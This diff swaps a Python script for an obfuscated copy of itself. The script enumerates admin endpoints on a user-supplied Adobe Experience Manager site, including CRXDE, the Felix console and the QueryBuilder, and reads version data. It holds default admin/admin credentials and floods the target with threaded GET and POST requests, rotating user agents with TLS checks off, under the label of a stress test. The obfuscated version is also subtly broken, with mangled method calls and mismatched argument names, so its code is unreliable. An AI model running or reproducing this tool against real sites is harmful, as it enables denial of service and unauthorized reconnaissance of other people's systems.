@@ -1,211 +1,112 @@
-import requests
-import time
-import json
-import random
-from concurrent.futures import ThreadPoolExecutor
-from requests.exceptions import RequestException
-from urllib3.exceptions import InsecureRequestWarning
-from typing import List, Dict, Optional
+lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll, llllllllllllIlI, llllllllllllIIl, llllllllllllIII, lllllllllllIlll = Exception, __name__, int, range, bool, input, KeyboardInterrupt, print, str
 
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from requests.packages.urllib3 import disable_warnings as IIlIIIIIIIlIlI
+from random import choice as IlIIlllIlllIll, uniform as lIllIllIIIIIIl
+from requests import head as lIllIlIIlIlIlI, post as lIIIIIIlllIIIl, get as llIlIIIIlIlllI
+from time import sleep as llIIlllIIIIllI, time as IllIIIlIlIIIll
+from concurrent.futures import ThreadPoolExecutor as IIIIlllllllllI
+from requests.exceptions import RequestException as IlIlIlllIIIllI
+from urllib3.exceptions import InsecureRequestWarning as IIlIllllIlIIll
+from typing import List as lIIlIIIIlllIll, Dict as IlIlIllIIlllIl, Optional as lllIIIIllIIIll
+IIlIIIIIIIlIlI(IIlIllllIlIIll)
 
-class AEMTester:
-    def __init__(self):
-        self.user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
-        ]
-        
-        self.headers = {
-            "Accept": "application/json, text/plain, */*",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Connection": "keep-alive",
-            "Content-Type": "application/json",
-        }
-        
-        # AEM-specific endpoints
-        self.endpoints = [
-            "/libs/granite/core/content/login.html",  # Login page
-            "/crx/de/index.jsp",  # CRXDE Lite
-            "/system/console",  # Felix Console
-            "/crx/explorer/browser/index.jsp",  # CRX Explorer
-            "/libs/cq/core/content/welcome.html",  # Welcome page
-            "/aem/start.html",  # AEM Start page
-            "/content.infinity.json",  # Content tree
-            "/system/sling/cqform/defaultlogin.html",  # Default login
-            "/etc.json",  # Configuration
-            "/content/dam.json",  # Digital Asset Manager
-            "/system/console/bundles",  # OSGi Bundles
-            "/system/console/configMgr",  # OSGi Configurations
-            "/system/console/status-productinfo",  # Product Info
-            "/bin/querybuilder.json",  # QueryBuilder
-            "/libs/granite/core/content/login",  # Granite UI Login
-            "/apps.tidy.infinity.json",  # Apps content
-            "/content/usergenerated",  # User Generated Content
-            "/system/health",  # Health Check
-            "/.cqactions.json",  # CQ Actions
-            "/content/screens",  # AEM Screens
-            "/content/communities",  # AEM Communities
-            "/content/forms",  # AEM Forms
-        ]
+class lIlIlIIlIIlIIIIIll:
 
-        self.payloads = {
-            "auth_test": {
-                "j_username": "admin",
-                "j_password": "admin",
-                "j_validate": "true"
-            },
-            "query_test": {
-                "path": "/content",
-                "type": "cq:Page",
-                "p.limit": "1"
-            }
-        }
+    def __init__(IllIlIllIlIlIIIllI):
+        IllIlIllIlIlIIIllI.llllIIIllIllIIllIl = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0']
+        IllIlIllIlIlIIIllI.lIllIllIIIllllIlIl = {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'en-US,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/json'}
+        IllIlIllIlIlIIIllI.IllllllIIllIIIlllI = ['/libs/granite/core/content/login.html', '/crx/de/index.jsp', '/system/console', '/crx/explorer/browser/index.jsp', '/libs/cq/core/content/welcome.html', '/aem/start.html', '/content.infinity.json', '/system/sling/cqform/defaultlogin.html', '/etc.json', '/content/dam.json', '/system/console/bundles', '/system/console/configMgr', '/system/console/status-productinfo', '/bin/querybuilder.json', '/libs/granite/core/content/login', '/apps.tidy.infinity.json', '/content/usergenerated', '/system/health', '/.cqactions.json', '/content/screens', '/content/communities', '/content/forms']
+        IllIlIllIlIlIIIllI.IlIIlIlllllIIlIllI = {'auth_test': {'j_username': 'admin', 'j_password': 'admin', 'j_validate': 'true'}, 'query_test': {'path': '/content', 'type': 'cq:Page', 'p.limit': '1'}}
 
-    def get_random_user_agent(self) -> str:
-        return random.choice(self.user_agents)
+    def IIlIIIIlllllIIIllI(IllIlIllIlIlIIIllI) -> lllllllllllIlll:
+        return IlIIlllIlllIll(IllIlIllIlIlIIIllI.llllIIIllIllIIllIl)
 
-    def verify_endpoint(self, url: str, endpoint: str) -> bool:
+    def lIIllIllIIlIlIIIlI(IllIlIllIlIlIIIllI, lllIIIIIIlIIIIIlll: lllllllllllIlll, lIIIllIIIIlllIllII: lllllllllllIlll) -> llllllllllllIll:
         """Verify if an AEM endpoint is accessible"""
-        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
+        lllIIlllllIlIIIlII = f"{lllIIIIIIlIIIIIlll.rstrip('/')}/{lIIIllIIIIlllIllII.lstrip('/')}"
         try:
-            response = requests.head(
-                full_url,
-                headers={"User-Agent": self.get_random_user_agent()},
-                timeout=5,
-                verify=False,
-                allow_redirects=True
-            )
-            return 200 <= response.status_code < 404
+            IlIlIIlIlIlIIIllll = lIllIlIIlIlIlI(lllIIlllllIlIIIlII, headers={'User-Agent': IllIlIllIlIlIIIllI.IIlIIIIlllllIIIllI()}, timeout=5, verify=llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0), allow_redirects=llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
+            return 200 <= IlIlIIlIlIlIIIllll.status_code < 404
         except:
-            return False
+            return llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0)
 
-    def discover_valid_endpoints(self, url: str) -> List[str]:
+    def IIlIIlllIIlIlllIll(IllIlIllIlIlIIIllI, lllIIIIIIlIIIIIlll: lllllllllllIlll) -> lIIlIIIIlllIll[lllllllllllIlll]:
         """Discover valid AEM endpoints"""
-        print("[INFO] Discovering valid AEM endpoints...")
-        valid_endpoints = []
-        
-        # Add AEM-specific endpoint patterns
-        additional_endpoints = [
-            "/content/geometrixx",  # Sample content
-            "/content/we-retail",   # Sample content
-            "/system/console/jmx",  # JMX Console
-            "/system/console/profiler", # Memory Profiler
-            "/system/console/diskbenchmark", # Disk Benchmark
-            "/libs/granite/core/content/homepage.html", # Granite homepage
-            "/mnt/overlay",  # Overlays
-            "/var/audit",    # Audit logs
-            "/var/statistics", # Statistics
-        ]
-        
-        self.endpoints.extend(additional_endpoints)
-        
-        for endpoint in self.endpoints:
-            if self.verify_endpoint(url, endpoint):
-                print(f"[SUCCESS] Found valid AEM endpoint: {endpoint}")
-                valid_endpoints.append(endpoint)
-        
-        return valid_endpoints or self.endpoints
+        llllllllllllIII('[INFO] Discovering valid AEM endpoints...')
+        IIIIIlIIIllIIllIIl = []
+        IlIllllllIlIIlllIl = ['/content/geometrixx', '/content/we-retail', '/system/console/jmx', '/system/console/profiler', '/system/console/diskbenchmark', '/libs/granite/core/content/homepage.html', '/mnt/overlay', '/var/audit', '/var/statistics']
+        IllIlIllIlIlIIIllI.IllllllIIllIIIlllI.extend(IlIllllllIlIIlllIl)
+        for lIIIllIIIIlllIllII in IllIlIllIlIlIIIllI.IllllllIIllIIIlllI:
+            if IllIlIllIlIlIIIllI.lIIllIllIIlIlIIIlI(lllIIIIIIlIIIIIlll, lIIIllIIIIlllIllII):
+                llllllllllllIII(f'[SUCCESS] Found valid AEM endpoint: {lIIIllIIIIlllIllII}')
+                IIIIIlIIIllIIllIIl.append(lIIIllIIIIlllIllII)
+        return IIIIIlIIIllIIllIIl or IllIlIllIlIlIIIllI.IllllllIIllIIIlllI
 
-    def check_aem_version(self, url: str) -> Optional[str]:
+    def lIlllllIIllIIIIIIl(IllIlIllIlIlIIIllI, lllIIIIIIlIIIIIlll: lllllllllllIlll) -> lllIIIIllIIIll[lllllllllllIlll]:
         """Try to determine AEM version"""
-        version_endpoints = [
-            "/system/console/status-productinfo",
-            "/system/console/bundles.json"
-        ]
-        
-        for endpoint in version_endpoints:
+        llIIIIIIllllIlIlll = ['/system/console/status-productinfo', '/system/console/bundles.json']
+        for lIIIllIIIIlllIllII in llIIIIIIllllIlIlll:
             try:
-                response = requests.get(
-                    f"{url.rstrip('/')}/{endpoint.lstrip('/')}",
-                    headers={"User-Agent": self.get_random_user_agent()},
-                    verify=False,
-                    timeout=5
-                )
-                if response.ok and "AEM" in response.text:
-                    return response.text
+                IlIlIIlIlIlIIIllll = llIlIIIIlIlllI(f"{lllIIIIIIlIIIIIlll.rstrip('/')}/{lIIIllIIIIlllIllII.lstrip('/')}", headers={'User-Agent': IllIlIllIlIlIIIllI.IIlIIIIlllllIIIllI()}, verify=llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0), timeout=5)
+                if IlIlIIlIlIlIIIllll.ok and 'AEM' in IlIlIIlIlIlIIIllll.text:
+                    return IlIlIIlIlIlIIIllll.text
             except:
                 continue
         return None
 
-    def send_request(self, method: str, url: str, endpoint: str, data: Dict = None) -> Optional[str]:
-        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
-        self.headers["User-Agent"] = self.get_random_user_agent()
-        
+    def IlllIIIIlIIIllIIlI(IllIlIllIlIlIIIllI, IIIlIllIlIIIIllIlI: lllllllllllIlll, lllIIIIIIlIIIIIlll: lllllllllllIlll, lIIIllIIIIlllIllII: lllllllllllIlll, IllllIllIIIlllIIlI: IlIlIllIIlllIl=None) -> lllIIIIllIIIll[lllllllllllIlll]:
+        lllIIlllllIlIIIlII = f"{lllIIIIIIlIIIIIlll.rstrip('/')}/{lIIIllIIIIlllIllII.lstrip('/')}"
+        IllIlIllIlIlIIIllI.lIllIllIIIllllIlIl['User-Agent'] = IllIlIllIlIlIIIllI.IIlIIIIlllllIIIllI()
         try:
-            if method.upper() == "GET":
-                response = requests.get(
-                    full_url, 
-                    headers=self.headers, 
-                    timeout=5, 
-                    verify=False,
-                    allow_redirects=True
-                )
+            if IIIlIllIlIIIIllIlI.upper() == 'GET':
+                IlIlIIlIlIlIIIllll = llIlIIIIlIlllI(lllIIlllllIlIIIlII, headers=IllIlIllIlIlIIIllI.lIllIllIIIllllIlIl, timeout=5, verify=llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0), allow_redirects=llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
             else:
-                response = requests.post(
-                    full_url, 
-                    json=data, 
-                    headers=self.headers, 
-                    timeout=5, 
-                    verify=False,
-                    allow_redirects=True
-                )
-            
-            print(f"[{response.status_code}] {method} {full_url}")
-            return response.text if response.ok else None
-            
-        except RequestException as e:
-            print(f"[ERROR] {method} {full_url}: {e}")
+                IlIlIIlIlIlIIIllll = lIIIIIIlllIIIl(lllIIlllllIlIIIlII, json=IllllIllIIIlllIIlI, headers=IllIlIllIlIlIIIllI.lIllIllIIIllllIlIl, timeout=5, verify=llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0), allow_redirects=llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
+            llllllllllllIII(f'[{IlIlIIlIlIlIIIllll.status_code}] {IIIlIllIlIIIIllIlI} {lllIIlllllIlIIIlII}')
+            return IlIlIIlIlIlIIIllll.text if IlIlIIlIlIlIIIllll.ok else None
+        except IlIlIlllIIIllI as llIIlIIlIIIllllIII:
+            llllllllllllIII(f'[ERROR] {IIIlIllIlIIIIllIlI} {lllIIlllllIlIIIlII}: {llIIlIIlIIIllllIII}')
             return None
 
-    def flood(self, url: str, workers: int = 10, duration: int = 60):
+    def lIIIllIIlllllIlIIl(IllIlIllIlIlIIIllI, lllIIIIIIlIIIIIlll: lllllllllllIlll, llIlIlIlIllIIIIlII: lllllllllllllIl=10, llIIlIlIIIlIIIIlIl: lllllllllllllIl=60):
         """Execute stress test on AEM instance"""
-        print(f"[INFO] Starting AEM stress test on {url} for {duration}s with {workers} workers")
-        
-        # Check AEM version first
-        version_info = self.check_aem_version(url)
-        if version_info:
-            print(f"[INFO] Detected AEM instance: {version_info}")
-        
-        valid_endpoints = self.discover_valid_endpoints(url)
-        if not valid_endpoints:
-            print("[WARNING] No valid AEM endpoints found. Using default endpoints.")
-            
-        start_time = time.time()
+        llllllllllllIII(f'[INFO] Starting AEM stress test on {lllIIIIIIlIIIIIlll} for {llIIlIlIIIlIIIIlIl}s with {llIlIlIlIllIIIIlII} workers')
+        IIIlIllIlIlIIlIllI = IllIlIllIlIlIIIllI.lIlllllIIllIIIIIIl(lllIIIIIIlIIIIIlll)
+        if IIIlIllIlIlIIlIllI:
+            llllllllllllIII(f'[INFO] Detected AEM instance: {IIIlIllIlIlIIlIllI}')
+        IIIIIlIIIllIIllIIl = IllIlIllIlIlIIIllI.IIlIIlllIIlIlllIll(lllIIIIIIlIIIIIlll)
+        if not IIIIIlIIIllIIllIIl:
+            llllllllllllIII('[WARNING] No valid AEM endpoints found. Using default endpoints.')
+        IIllIIIlIllIIlllIl = IllIIIlIlIIIll()
 
-        def attack():
-            while time.time() - start_time < duration:
-                endpoint = random.choice(self.endpoints)
-                method = random.choice(["GET", "POST"])
-                payload = self.payloads["query_test"] if method == "POST" else None
-                
-                result = self.send_request(method, url, endpoint, data=payload)
-                if result:
-                    time.sleep(random.uniform(0.1, 0.3))
+        def lllIllIIllIlIlIIll():
+            while IllIIIlIlIIIll() - IIllIIIlIllIIlllIl < llIIlIlIIIlIIIIlIl:
+                lIIIllIIIIlllIllII = IlIIlllIlllIll(IllIlIllIlIlIIIllI.IllllllIIllIIIlllI)
+                IIIlIllIlIIIIllIlI = IlIIlllIlllIll(['GET', 'POST'])
+                lIIlIllIlIlIllIIlI = IllIlIllIlIlIIIllI.IlIIlIlllllIIlIllI['query_test'] if IIIlIllIlIIIIllIlI == 'POST' else None
+                lIIllIlIIlIllIlIII = IllIlIllIlIlIIIllI.IlllIIIIlIIIllIIlI(IIIlIllIlIIIIllIlI, lllIIIIIIlIIIIIlll, lIIIllIIIIlllIllII, data=lIIlIllIlIlIllIIlI)
+                if lIIllIlIIlIllIlIII:
+                    llIIlllIIIIllI(lIllIllIIIIIIl(0.1, 0.3))
                 else:
-                    time.sleep(random.uniform(0.5, 1.0))
+                    llIIlllIIIIllI(lIllIllIIIIIIl(0.5, 1.0))
+        with IIIIlllllllllI(max_workers=llIlIlIlIllIIIIlII) as lIlIlIIllIlIllIlIl:
+            llllIIIlIIIIIIIIII = [lIlIlIIllIlIllIlIl.submit(lllIllIIllIlIlIIll) for IIlIIIIIlllllIIIIl in lllllllllllllII(llIlIlIlIllIIIIlII)]
+            for lllIllIlIllIlIIIII in llllIIIlIIIIIIIIII:
+                lllIllIlIllIlIIIII.lIIllIlIIlIllIlIII()
 
-        with ThreadPoolExecutor(max_workers=workers) as executor:
-            futures = [executor.submit(attack) for _ in range(workers)]
-            for future in futures:
-                future.result()
-
-def main():
-    target_url = input("Enter target AEM URL (e.g., https://example.com): ").strip()
-    if not (target_url.startswith("http://") or target_url.startswith("https://")):
-        print("[ERROR] Invalid URL. Please include http:// or https://")
+def lIlllllllIIlIIllll():
+    IIlllIlIIlIIlIIllI = llllllllllllIlI('Enter target AEM URL (e.g., https://example.com): ').strip()
+    if not (IIlllIlIIlIIlIIllI.startswith('http://') or IIlllIlIIlIIlIIllI.startswith('https://')):
+        llllllllllllIII('[ERROR] Invalid URL. Please include http:// or https://')
         return
-    
     try:
-        tester = AEMTester()
-        workers = int(input("Enter number of workers (default: 20): ") or "20")
-        duration = int(input("Enter duration in seconds (default: 120): ") or "120")
-        tester.flood(target_url, workers=workers, duration=duration)
-    except KeyboardInterrupt:
-        print("\n[INFO] Test interrupted by user.")
-    except Exception as e:
-        print(f"[ERROR] Unexpected error occurred: {e}")
-
-if __name__ == "__main__":
-    main() 
+        lllIlIIIIlIllllIII = lIlIlIIlIIlIIIIIll()
+        llIlIlIlIllIIIIlII = lllllllllllllIl(llllllllllllIlI('Enter number of workers (default: 20): ') or '20')
+        llIIlIlIIIlIIIIlIl = lllllllllllllIl(llllllllllllIlI('Enter duration in seconds (default: 120): ') or '120')
+        lllIlIIIIlIllllIII.lIIIllIIlllllIlIIl(IIlllIlIIlIIlIIllI, workers=llIlIlIlIllIIIIlII, duration=llIIlIlIIIlIIIIlIl)
+    except llllllllllllIIl:
+        llllllllllllIII('\n[INFO] Test interrupted by user.')
+    except lllllllllllllll as llIIlIIlIIIllllIII:
+        llllllllllllIII(f'[ERROR] Unexpected error occurred: {llIIlIIlIIIllllIII}')
+if llllllllllllllI == '__main__':
+    lIlllllllIIlIIllll()
